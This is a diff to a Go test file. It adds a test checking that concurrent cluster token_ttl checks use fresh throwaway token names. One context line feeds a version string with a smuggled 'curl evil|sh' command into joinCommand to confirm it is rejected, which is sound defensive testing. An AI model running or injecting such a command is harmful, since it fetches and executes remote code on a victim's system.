@@ -8,6 +8,7 @@ import (
 	"net/http/httptest"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -872,5 +873,39 @@ func TestJoinCommandQuotesAndPins(t *testing.T) {
 	}
 	if joinCommand("v0.7.0; curl evil|sh", "u", "t", "h", "mixed") != "" {
 		t.Error("a version that is not a release tag produced a command")
+	}
+}
+
+// The token_ttl check mints a throwaway token. A fixed name made a second
+// check at the same moment fail with a 409, and every check fail once a
+// revoke had left the token behind.
+func TestCheckClusterTokenTTLNameIsFresh(t *testing.T) {
+	fake := newClusterFake(t)
+	s := newClusterService(t)
+	addTestCluster(t, s, fake, "eu-west")
+	// A token left over under the old fixed name.
+	if _, err := aerolvm.New(fake.URL(), fake.AdminToken).CreateToken(context.Background(), aerolvm.CreateTokenRequest{
+		Name: "lewbox-ttl-check", Role: "runner", Team: "lewbox-check", ExpiresIn: "36500d",
+	}); err != nil {
+		t.Fatal(err)
+	}
+	var wg sync.WaitGroup
+	results := make([]ClusterDetail, 2)
+	errs := make([]error, 2)
+	for i := range results {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			results[i], errs[i] = s.CheckCluster(localCtx(), "eu-west")
+		}()
+	}
+	wg.Wait()
+	for i, detail := range results {
+		if errs[i] != nil {
+			t.Fatalf("check %d: %v", i, errs[i])
+		}
+		if check, ok := findCheck(detail.Checks, "token_ttl"); !ok || !check.OK {
+			t.Errorf("check %d: token_ttl = %+v", i, check)
+		}
 	}
 }
